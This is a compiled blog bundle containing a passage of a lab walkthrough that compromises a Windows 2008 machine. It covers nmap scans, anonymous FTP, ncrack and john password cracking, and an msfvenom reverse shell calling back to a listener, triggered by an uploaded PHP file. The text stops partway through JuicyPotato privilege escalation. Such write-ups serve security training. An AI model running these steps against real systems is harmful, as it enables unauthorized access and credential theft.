"use strict";(self.webpackChunkminimal_blog=self.webpackChunkminimal_blog||[]).push([[270],{4765:function(e,n,t){t.d(n,{F:function(){return d},Z:function(){return g}});var a=t(7294),l=t(8733),i=t(795),s=t(8377),r=t(6799),c=t(8871);var o=e=>{let{post:n}=e;return null};const m=["16px","8px","4px"].map((e=>`rgba(0, 0, 0, 0.1) 0px ${e} ${e} 0px`));var p=e=>{let{data:{post:n},children:t}=e;return(0,l.tZ)(s.Z,null,(0,l.tZ)(i.X6,{as:"h1",variant:"styles.h1"},n.title),(0,l.tZ)("p",{sx:{color:"secondary",mt:3,a:{color:"secondary"},fontSize:[1,1,2]}},(0,l.tZ)("time",null,n.date),n.tags&&(0,l.tZ)(a.Fragment,null," — ",(0,l.tZ)(r.Z,{tags:n.tags})),n.timeToRead&&" — ",n.timeToRead&&(0,l.tZ)("span",null,n.timeToRead," min read")),(0,l.tZ)("section",{sx:{my:5,".gatsby-resp-image-wrapper":{my:[4,4,5],borderRadius:"4px",boxShadow:m.join(", "),".gatsby-resp-image-image":{borderRadius:"4px"}},variant:"layout.content"}},t),(0,l.tZ)(o,{post:n}))};const d=e=>{var n,t,a;let{data:{post:i}}=e;return(0,l.tZ)(c.Z,{title:i.title,description:i.description?i.description:i.excerpt,image:i.banner?null===(n=i.banner)||void 0===n||null===(t=n.childImageSharp)||void 0===t||null===(a=t.resize)||void 0===a?void 0:a.src:void 0,pathname:i.slug,canonicalUrl:i.canonicalUrl})};function g(e){let{...n}=e;return a.createElement(p,n)}},6799:function(e,n,t){var a=t(8733),l=t(7294),i=t(1883),s=t(3494),r=t(9706);n.Z=e=>{let{tags:n}=e;const{tagsPath:t,basePath:c}=(0,s.Z)();return(0,a.tZ)(l.Fragment,null,n.map(((e,n)=>(0,a.tZ)(l.Fragment,{key:e.slug},!!n&&", ",(0,a.tZ)(i.Link,{sx:e=>{var n;return{...null===(n=e.styles)||void 0===n?void 0:n.a}},to:(0,r.Z)(`/${c}/${t}/${e.slug}`)},e.name)))))}},8871:function(e,n,t){var a=t(7294),l=t(1883),i=t(4232);n.Z=e=>{let{title:n="",description:t="",pathname:s="",image:r="",children:c=null,canonicalUrl:o=""}=e;const m=(0,i.Z)(),{siteTitle:p,siteTitleAlt:d,siteUrl:g,siteDescription:u,siteImage:A,author:b,siteLanguage:h}=m,f={title:n?`${n} | ${p}`:d,description:t||u,url:`${g}${s||""}`,image:`${g}${r||A}`};return a.createElement(a.Fragment,null,a.createElement("html",{lang:h}),a.createElement("title",null,f.title),a.createElement("meta",{name:"description",content:f.description}),a.createElement("meta",{name:"image",content:f.image}),a.createElement("meta",{property:"og:title",content:f.title}),a.createElement("meta",{property:"og:url",content:f.url}),a.createElement("meta",{property:"og:description",content:f.description}),a.createElement("meta",{property:"og:image",content:f.image}),a.createElement("meta",{property:"og:type",content:"website"}),a.createElement("meta",{property:"og:image:alt",content:f.description}),a.createElement("meta",{name:"twitter:card",content:"summary_large_image"}),a.createElement("meta",{name:"twitter:title",content:f.title}),a.createElement("meta",{name:"twitter:url",content:f.url}),a.createElement("meta",{name:"twitter:description",content:f.description}),a.createElement("meta",{name:"twitter:image",content:f.image}),a.createElement("meta",{name:"twitter:image:alt",content:f.description}),a.createElement("meta",{name:"twitter:creator",content:b}),a.createElement("meta",{name:"gatsby-theme",content:"@lekoarts/gatsby-theme-minimal-blog"}),a.createElement("link",{rel:"icon",type:"image/png",sizes:"32x32",href:(0,l.withPrefix)("/favicon-32x32.png")}),a.createElement("link",{rel:"icon",type:"image/png",sizes:"16x16",href:(0,l.withPrefix)("/favicon-16x16.png")}),a.createElement("link",{rel:"apple-touch-icon",sizes:"180x180",href:(0,l.withPrefix)("/apple-touch-icon.png")}),o?a.createElement("link",{rel:"canonical",href:o}):null,c)}},9147:function(e,n,t){t.r(n),t.d(n,{Head:function(){return r.F},default:function(){return c}});var a=t(7294),l=t(1151);function i(e){const n=Object.assign({span:"span",h1:"h1",h2:"h2",pre:"pre",code:"code",p:"p",ul:"ul",li:"li",h3:"h3",ol:"ol",a:"a"},(0,l.ah)(),e.components);return a.createElement(a.Fragment,null,a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 878px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 23.75%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAABYlAAAWJQFJUiTwAAABC0lEQVR42k2N6U6DQBSFeQYRGBiglK0wbKUMtVbr0ljaxKVqGmPf/0GOM0M0/vhy71nujMYijiLmYFGHXCD3kf5vlxlTWa+QN//1b1962vFwxma5F8ZSGD2u5ls8bd7wvDvhdfjCDd8hD3s02TX2jx94ER6v7lClKxy2nxjujxge3nHbD+ojjaUV4oAhcBNEkwxpWCGLa+RJDZY2mEUlkikTFMqTpGGh9JgVQpfqDYn2fabIsxnWqzWCSQDf88E7jnbeKrpFhyiMYVwaKIoSuq5Dv9BBLIK6bhSc92jbBUzR0VhO4VMP0yACdVxYJgG1XbU7NlWTEBumYcEmjpoS2XPFnef6I9SHZRD8AHmnlNScrp21AAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="info"\n        title=""\n        src="/static/aa91c6ac04a5c1e680ddd6a302c510bf/8739e/info.png"\n        srcset="/static/aa91c6ac04a5c1e680ddd6a302c510bf/5243c/info.png 240w,\n/static/aa91c6ac04a5c1e680ddd6a302c510bf/ab158/info.png 480w,\n/static/aa91c6ac04a5c1e680ddd6a302c510bf/8739e/info.png 878w"\n        sizes="(max-width: 878px) 100vw, 878px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(n.h1,null,"Recon"),"\n",a.createElement(n.h2,null,"Nmap"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"nmap -sC -sV -Pn 192.168.229.46\n")),"\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 756px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 76.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACFUlEQVR42pVU13LbQAzkr8Sy1UWKvRx7kUg11yT//yUIFqTpSKN4Jg+YO5KHxe4CRy0tjuRHNamso7w6U1FfaGuntN5GtNJDSssjdadf5IYVhfGOonQve9PNSLdiepzbNF26Y2iWlwsQwvYLcoKSNmYse8vNaetk5HFBxy/lmxtU8n1tKC6qpCiAnhZOD6hbCdlewZHTfOVRxsArIyQvrJlFLgdjZg/mgWKGyV6K1/tXqnbPlNdnYaxzEZzVjAEQbBYbn4rmInJhA1iiKoCRqLJWZGO/O7xT2TxLWJw/MoQkJEPOUg9GQG949+PJJMNOqGlfKckPwjarTsz4LM84B0VXgN43gA9Tk+AzJCfcQDQRK1hCvsX5yJuxXQKIbkEGfFiywUgUDwfJD1NLmlA2L+Jvz7D3sD1+SC4UzNcDYMAvsvIkY4NEMIRnIVf3o0YY4j2AfNVIIZW2zPLAI9Ry8YgmM+trbPARxsIX8YgDsjBveEZBFIASSJdx4iZsTCUz+OndCIgu92PwIsBggMTFOmAZvnjz99qHN3p2Gxr8AtDx8ls62XRvEpAI0+8lfRcapr3kAd3zXIElzIY/6CIOTFjW49z5P8CM7ytYosP5MF+4v+ggbgdWmH/r111AmI4mYFDBDlIBvmPZ3eknr+9yiyZDA+414goQrY+lu11/tdg3jI5KOymEFeOCnwOuKPYG/43+BfoHp9vxedMcjHgAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="nmap"\n        title=""\n        src="/static/eb09ce982f6916892998fc141f834b53/ee7ce/nmap.png"\n        srcset="/static/eb09ce982f6916892998fc141f834b53/5243c/nmap.png 240w,\n/static/eb09ce982f6916892998fc141f834b53/ab158/nmap.png 480w,\n/static/eb09ce982f6916892998fc141f834b53/ee7ce/nmap.png 756w"\n        sizes="(max-width: 756px) 100vw, 756px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(n.p,null,"Then, I will run a full port nmap scan"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"nmap -sC -sV -Pn --open -p- 192.168.229.46\n")),"\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 732px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 60.83333333333334%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABqklEQVR42pWT6VLCcAzE+ywiIKBgKb3v0osbD5zR93+PNRurjufoh0z7b5tfNpvUKKoDbH+JIG6QFlvk5Q5XZoje0MLZwMTcybA7PiLK1jDtDF5YwYsqBEkLV+5nVoLx1MfFpYvB2IbhR7VA9goicNkcsfAKTeA1SleoVrfdN3sk+QZOUMIREZaba8HrRYLRlYf+aAHDlZdZB7OcXCGsrKGJpQKYcH5h4VySesO5qu/x3EVf1KlCVkiXO1UU52ttzRPVBPpqwwaZvOd5akaqambFqoxFBh3oNQyC1Ltqr1C2VUuLodzTW6oj2A1LLUTFk1mg8OHE+QrkR2yZ3oTilx81HeDdeNNOxacUpgQV0jM++wxT4HQeSctbNb5qbzvvKoxkalRCo9+UTOxvVX0AMqmoD9jfPKFZ32u0mxMS8Y6qx9OX6f0G+Qi8DrCsj1htH1DKyjTrO229liv3ixP9F1Bb5v4JlEv+umssQOW++MhdpId/ARuBDIFrQVjV3ii8kIm3m3uBnrDanXQ4f1WpU/bjWleCvxXXJBaFeu6Cz7jwnLDtvazST8N5BteZjVSQnGYIAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="full-nmap"\n        title=""\n        src="/static/3d4f76a3946e0bfc49ca89171c153d85/8fb8e/full-nmap.png"\n        srcset="/static/3d4f76a3946e0bfc49ca89171c153d85/5243c/full-nmap.png 240w,\n/static/3d4f76a3946e0bfc49ca89171c153d85/ab158/full-nmap.png 480w,\n/static/3d4f76a3946e0bfc49ca89171c153d85/8fb8e/full-nmap.png 732w"\n        sizes="(max-width: 732px) 100vw, 732px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(n.p,null,"The full port scan reveals two extra ports, 242 and 3145."),"\n",a.createElement(n.h2,null,"FTP - Port 21"),"\n",a.createElement(n.p,null,"From the nmap results, we can see that anonymous ftp login is allowed."),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"use ",a.createElement(n.code,null,"anonymous")," as the user and no password"),"\n",a.createElement(n.li,null,"after logging in, check what users are available by looking into the accounts directory"),"\n"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"ftp 192.168.229.46\n")),"\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 47.91666666666667%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABiUlEQVR42o2S2VLDMAxF8y90TdMl++Y4e9I0LS10+sL//8dFUoGBBwoPd2R77GPpSoZTnJGWIzSpbJ5R1Cc4QQFrl2Bm+pivAtHCCkV89khGXh5QVEek+YBU75ETUFcj7fdIsh6x6rDztMiPa5ibGNOl9ztQE0wRLFa9ALPiIA8TWtf9BXV3kQz/yuwLOBxvkhFDo7QVGO+3biaZ3Ev2/w+s2jNlcUZ/uKLZvyCiEtvhVcAMXdspnubOwzJ/ALlELpubwT56UQU3LAUYqRa2n8MNSomfpU9FASYUv+vLQzY/IAA3IKa1F9XwCcznG0dhtY2lGfxgQpkuli5WSweW6ZI8rEnWhy2GKgb5nR8ESUMxEgiPDpfKl2xfywe2l8NPWpzyBmPRQ3kK4TYQ6fX9rhFSI+5zl6IbruSZEnBOmTPQXEdy3pK/3KyG/L0dzuiomcPlDc14Q1yMSAg6o+yNe5kdQvo5o5nkpvDIsJeThSu+7Vwt4gZtKFaBQhNmaJMSVaiR2SGU5Yq3766DR6xLuGlwAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="accounts"\n        title=""\n        src="/static/567c30bba7605bca05b0623230ca5c77/eefce/accounts.png"\n        srcset="/static/567c30bba7605bca05b0623230ca5c77/5243c/accounts.png 240w,\n/static/567c30bba7605bca05b0623230ca5c77/ab158/accounts.png 480w,\n/static/567c30bba7605bca05b0623230ca5c77/eefce/accounts.png 720w"\n        sizes="(max-width: 720px) 100vw, 720px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(n.h3,null,"Ncrack"),"\n",a.createElement(n.p,null,"Ncrack is a powerful open-source network authentication cracking tool. It's designed to help assess and strengthen the security of networks by identifying weak credentials.\nNcrack supports various protocols such as SSH, RDP, FTP, Telnet, HTTP(S), and more, making it versatile for testing a wide range of systems. With its robust and flexible features, Ncrack is the perfect\noption to try and crack any default passwords now that we have a list of usernames."),"\n",a.createElement(n.p,null,"I created a usernames.txt file with the following entries"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"admin\nbackup\nOffsec\n")),"\n",a.createElement(n.p,null,"Then, running the following command reveals valid default credentials"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"ncrack -U usernames.txt -P /SecLists-master/Passwords/Default-Credentials/default-passwords.txt ./passwords.txt\n")),"\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 618px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABTUlEQVR42m2Q2W6CUBCGeRaLFUEpngUOywGOQLRYNSZNl8v2/d/h7wxGmya9mMxk/plvFm8mB/iqwyzOkTd7jMc3HE7vaPsThNlCFB0OU+4D/f4C60aI1EGTlhY9snKguJssJIaXksCiIUFmDqukRPRUQFG80S0kFW4ojmWNtSDbVFdI3hG4RaJq6rvCl2sDL1HNBLoKDGmQUDPnta6RaQtDvjAOVe6gCMIgrmXPw4NVRtsZLCINr99dwGbbEW44YTuc6awDqnqPV+vwdbzgXLb43L3g+3lELXKESYUnYSdguM7hBwrzpcJjSEA+gUU+lSfxZrGgnLSosgaFKpHLAtY0qHSFlLaNqNYP5GQ30M08/l9G96f0Ez5X0N8YxmBBv1nRsIiHUj7m91A96/Ol/gO6AxkQUxMDGe4v5H26vxCY8xbBb+6Bcuz/gzHwB9SE5Z26p2ZiAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="ncrack"\n        title=""\n        src="/static/4b0bdba41385b068aca307ac33dba262/e2d37/ncrack.png"\n        srcset="/static/4b0bdba41385b068aca307ac33dba262/5243c/ncrack.png 240w,\n/static/4b0bdba41385b068aca307ac33dba262/ab158/ncrack.png 480w,\n/static/4b0bdba41385b068aca307ac33dba262/e2d37/ncrack.png 618w"\n        sizes="(max-width: 618px) 100vw, 618px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(n.p,null,"Login to the ftp console as admin"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"then, use the command ",a.createElement(n.code,null,"mget *")," in ftp to download all the files for the admin user"),"\n",a.createElement(n.li,null,"there are three files, ",a.createElement(n.code,null,".htaccess"),", ",a.createElement(n.code,null,".htpasswd")," and ",a.createElement(n.code,null,"index.php")),"\n",a.createElement(n.li,null,"looking at all the files, ",a.createElement(n.code,null,".htpasswd")," has a password for the user offsec that we can crack using john"),"\n"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"john --wordlist=/usr/share/wordlists/rockyou.txt .htpasswd\n")),"\n",a.createElement(n.p,null,"John successfully cracked the password for user offsec which is ",a.createElement(n.code,null,"elite")),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"the password does not work for ftp login using username offsec, so we can try this credential for other services"),"\n"),"\n",a.createElement(n.h2,null,"HTTP - Port 242"),"\n",a.createElement(n.p,null,"We can use the credentials ",a.createElement(n.code,null,"offsec:elite")," to authenticate to the http"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"using these credentials, we can run a gobuster scan with the ",a.createElement(n.code,null,"-U")," and ",a.createElement(n.code,null,"-P")," flags"),"\n"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"gobuster dir -u http://192.168.229.46:242/ -w /usr/share/dirb/wordlists/common.txt -k -x .txt,.php -U offsec -P elite\n")),"\n",a.createElement(n.p,null,"The gobuster results show status code 200 for ",a.createElement(n.code,null,"index.php"),", however, there aren't any other interesting results."),"\n",a.createElement(n.h1,null,"Exploitation"),"\n",a.createElement(n.p,null,"We will be able to access files uploaded through admin user FTP. We can upload a reverse shell through FTP and then access it from the\nauthenticated HTTP server"),"\n",a.createElement(n.ol,null,"\n",a.createElement(n.li,null,"Create a msfvenom reverse shell for a Windows machine"),"\n"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.230 LPORT=1234 -f exe > revshell.exe\n")),"\n",a.createElement(n.ol,{start:"2"},"\n",a.createElement(n.li,null,"Create a php file to run the reverse shell, otherwise, going to ",a.createElement(n.code,null,"/revshell.exe")," will simply download the file"),"\n"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"<?php\n$exec = system('revshell.exe', $val)\n?>\n")),"\n",a.createElement(n.ol,{start:"3"},"\n",a.createElement(n.li,null,"\n",a.createElement(n.p,null,"Now, log in as admin through FTP and use ",a.createElement(n.code,null,"mput")," to upload the reverse shell and the run.php\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 67.5%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAABYlAAAWJQFJUiTwAAAB2ElEQVR42o1U13LbQAzkn7iQEptYjr0dq0zR9mSSTP7/WzYAZPHJRQ87OHGOy90FIEO1byjqM+ruBVWzIFQNbDfFkeAHJdxTTucElq3wfIh+hNHpFQ2RFdUklYm7/oIoaYmswCmsYHspnqzwPsJ+ZoUL0nIUJMUAP6rhEdHzIcSjGdxNJoTbdME2rbgMK5Z2xjqQ2jCHRzYficg8xoK7Cf8OC274Ny340xNpWiJyFSwiNenSTeU9MHS/gnPUlNtI9tvujFZzlvR82FC1Z8SUp+1lAucDt7PtZ5Kx41+fGcP8jun8C3p8xUCETJJSjmne06VcGuOHJbyAUUjn+ezv50Lg0l0mN1pSxl3tibDrN6hUS8eTohfiU1Tttr/Dbrmk2atbstiyVRohfR0hRs61npFR98O43hHEjSCUev3Ns8sQhUxa0osNEeb0sko7eGT14CTSYRkbrh8wP8HeZc4tr0ZRwopUpqUR/GXOiDfmgSxZVgD/EMAlmN+Njco6CT9KOukSbwivGYOVxgSuW60xlxpdmEI5ER6s6FNig3PglpfNLMScHVu1jkoy1eMm6/hKC/B7fRdShzbo6SuF/BLPWVHNopJtszrOjf8oVNZLDQjcHP4oR/CV7f+0NLZjprrG+wAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="upload"\n        title=""\n        src="/static/f30acf97bc3c523baf0aabae934fe080/7d769/upload.png"\n        srcset="/static/f30acf97bc3c523baf0aabae934fe080/5243c/upload.png 240w,\n/static/f30acf97bc3c523baf0aabae934fe080/ab158/upload.png 480w,\n/static/f30acf97bc3c523baf0aabae934fe080/7d769/upload.png 960w,\n/static/f30acf97bc3c523baf0aabae934fe080/0a200/upload.png 1434w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n",a.createElement(n.li,null,"\n",a.createElement(n.p,null,"Start a nc listener with ",a.createElement(n.code,null,"nc -lnvp 1234")),"\n"),"\n",a.createElement(n.li,null,"\n",a.createElement(n.p,null,"Go to url ",a.createElement(n.code,null,"http://192.168.229.46/run.php")," to trigger the php script that will run the reverse shell.\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 28.750000000000004%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA80lEQVR42p2QWVLDMBBEfRIgQAAn3mTJ8SbZMkY4qRRw/9M0M5MKVc4nH10ajdRvlmirPxCrFq+6h2kmZKrDS6zxuM3x8JT+6W6TUL5c5TnePGerezSHL4zTCXZYMIdvDBQP/oTefcLUXtR0M+x4hDmMyMsehbZQxknxorSUI6le4BGbOxtQNR5+PsOR0XmGHtG5AP9+Rlh+CDxhlxyQFp2ASoIneQulnRS5dh9peuAu0qJFWQ1SOSbjPqtldI53aS1i09veUK4iWEPx5eS/DBMgdyAgGoNPNl52kq32w+L7VZK72Z8A7bjQuJPs4P7m8T/6BVchu5BWjq3eAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="foothold"\n        title=""\n        src="/static/27ea4dc03b7ee6230e609e8c28980407/7d769/foothold.png"\n        srcset="/static/27ea4dc03b7ee6230e609e8c28980407/5243c/foothold.png 240w,\n/static/27ea4dc03b7ee6230e609e8c28980407/ab158/foothold.png 480w,\n/static/27ea4dc03b7ee6230e609e8c28980407/7d769/foothold.png 960w,\n/static/27ea4dc03b7ee6230e609e8c28980407/28aea/foothold.png 990w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n"),"\n",a.createElement(n.p,null,"We are able to get a foothold on the system as user livda\\apache."),"\n",a.createElement(n.h2,null,"Privilege Escalation"),"\n",a.createElement(n.p,null,"We can enumerate the system for useful information"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"whoami /all\n")),"\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 25%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA7UlEQVR42nVQ21aDMBDkU6r0phxSSBoo4Q5StdUe//9nxp2t+ubDnCS7m7ls5IoeRTXB+g6hWVAJdk8Oqzj9w8Pa/ItVbHTmcWMEB0RpVuFga+THFs9pgfUux2ZvsRVS9jLbSL3U+i/Y4wzv+8TrXLzN7oShPWN6+UA/XVB3ryjD/ENeohsv6IZ31DJzLEeEdoE/jTB5kJlGTyYbpisSc1K3US+f5vMN83LDKMTz8onMNao+zhS6qhCFSU4COiIZE3Fly9sXTBY0esTP1rfiYFA438sK7urs5a7V2HTNt8lrdc+I3CEj03UiNb6/AXuAoAKbQj5RAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="impersonate"\n        title=""\n        src="/static/0f19e29281813abc32949fc2dea1848d/7d769/impersonate.png"\n        srcset="/static/0f19e29281813abc32949fc2dea1848d/5243c/impersonate.png 240w,\n/static/0f19e29281813abc32949fc2dea1848d/ab158/impersonate.png 480w,\n/static/0f19e29281813abc32949fc2dea1848d/7d769/impersonate.png 960w,\n/static/0f19e29281813abc32949fc2dea1848d/5c0f7/impersonate.png 1242w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(n.p,null,"Also, get more detailed information on the system\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 76.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAABYlAAAWJQFJUiTwAAACHElEQVR42pVT2W7iQBDkR5JgDAZje3zi+75wgBApb/uw0v7/T9R2TwS7aCHaPJTGmnHXdFfVzISbwvFzLNculKWAsrKh6y5scwddo29NSGzXNsGRMDYOVPpvcQezqjmg7U8wRISl5uBZtTCGKX4ezzhXHT66Ee91j0NW4Vy2OBYNJj+EQRfM7xFGaYeifkVRTTCsCE+KicBN8DaesG8mTC2dRSVs6trZehC0WmuBJRUr9wjzco8kH5AToe1lWK09GHaCMO0RxA10EUPdeHghOS6YPxhXEjb9G+ruiKwcEVO3wkmhWyFSuiijS6KklWfCSaCQHKyd+hVhWoxgHbnTIKxp04FHRh2GE6qsg+dncIMCGyOQpv1drCx5FTf7M+6Ax3WDEnPq4FkVGIIYv8YJP5oO3S6FTYQmjc4FKhnHK6fighXhShhnPRKCtyuxIq2Y1KKxP6U4gSfICCnpHEQ1wqQBG2l7uZTHtGNw9GTsLqYwuNAhU5hQN8OrDDsyhnN66Yov1XTvsYbscFIM8HjkhYWXhYktmcJGcD6r9iDJU/rHImMWXxgiCTl/DRWywyz+5wgZ+v27zKbrF3JfdkpjMul6+69Bf1zOR8phLzUqKeA+aWmQARx21uZJMWQxSzF/QHLbYT3J2xmsGWu0pRfDhDq9Z+U/SG4I2+EsifiVsHYcC5/yyM5quv8tsqspUj/Sil1kU3hU7pLH/C7hb4h31kDKLsZoAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="systeminfo"\n        title=""\n        src="/static/1322ee65f6f9d59cf16417db3c8bd1ce/7d769/systeminfo.png"\n        srcset="/static/1322ee65f6f9d59cf16417db3c8bd1ce/5243c/systeminfo.png 240w,\n/static/1322ee65f6f9d59cf16417db3c8bd1ce/ab158/systeminfo.png 480w,\n/static/1322ee65f6f9d59cf16417db3c8bd1ce/7d769/systeminfo.png 960w,\n/static/1322ee65f6f9d59cf16417db3c8bd1ce/aeb15/systeminfo.png 1392w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(n.p,null,"From the enumeration we can see that"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"the ",a.createElement(n.code,null,"SeImpersonatePrivilege")," is enabled"),"\n",a.createElement(n.li,null,"the machine is running a Windows 2008 Server x86"),"\n"),"\n",a.createElement(n.p,null,"We can use Juicy Potato found ",a.createElement(n.a,{href:"https://github.com/ivanitlearning/Juicy-Potato-x86/releases"},"here")),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"JuicyPotato requires a class ID (CLSID) which is unique to the operating system"),"\n",a.createElement(n.li,null,"the website ",a.createElement(n.a,{href:"https://ohpe.it/juicy-potato/CLSID/"},"here")," helps us choose a CLSID, use the CLSID for Windows Server 2008 in this case"),"\n"),"\n",a.createElement(n.ol,null,"\n",a.createElement(n.li,null,"Clone the JuicyPotato.exe file and upload to the machine using admin FTP"),"\n",a.createElement(n.li,null,"Create another msfvenom reverse shell to use for juicy 